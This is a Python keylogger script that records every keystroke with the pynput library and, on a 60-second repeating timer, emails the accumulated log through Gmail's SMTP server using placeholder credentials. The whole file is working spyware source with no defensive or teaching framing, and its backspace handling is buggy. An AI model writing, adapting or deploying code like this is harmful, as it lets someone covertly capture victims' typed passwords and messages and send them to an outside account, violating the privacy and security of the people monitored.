#Modules
from http import server
from pynput.keyboard import Key, Listener
import smtplib, ssl
from threading import Timer
from time import sleep

#Variables
n = 60 #clock value (seconds)
log = "" #log variable (keylogging memory)
word = ""

#Classes - Repeated Timer(object): repeats the functions
class RepeatedTimer(object):
    def __init__(self, interval, function, *args, **kwargs):
        self._timer     = None
        self.interval   = interval
        self.function   = function
        self.args       = args
        self.kwargs     = kwargs
        self.is_running = False
        self.start()

    def _run(self):
        self.is_running = False
        self.start()
        self.function(*self.args, **self.kwargs)

    def start(self):
        if not self.is_running:
            self._timer = Timer(self.interval, self._run)
            self._timer.start()
            self.is_running = True

#Functions - on_press(): memorizes the keyboard inputs on the log variable
def on_press(key):
    global char
    global word
    global log

    if key == Key.space or key == Key.enter:
        word += " "
        log += word
        word = ""
    elif key == Key.shift_r or key == Key.shift_l:
        return
    elif key == Key.backspace:
        char = char[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    if key == Key.esc:
        return False

#Functions - report(): sends the log via email through the SMTP protocol
def report():
    global server
    global email

    smtp_server = "smtp.gmail.com"
    email = "youremail"
    password = "yourpass"
    port = 587 #std smtp port

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(email, password)
        server.sendmail(email, email, log)

    except Exception as e:
        print(e)

#Functions: clock(): repeats the report() function based on the rt set up
def clock():
    report()

rt = RepeatedTimer(n, clock)

with Listener(on_press=on_press) as listener:
    listener.join()
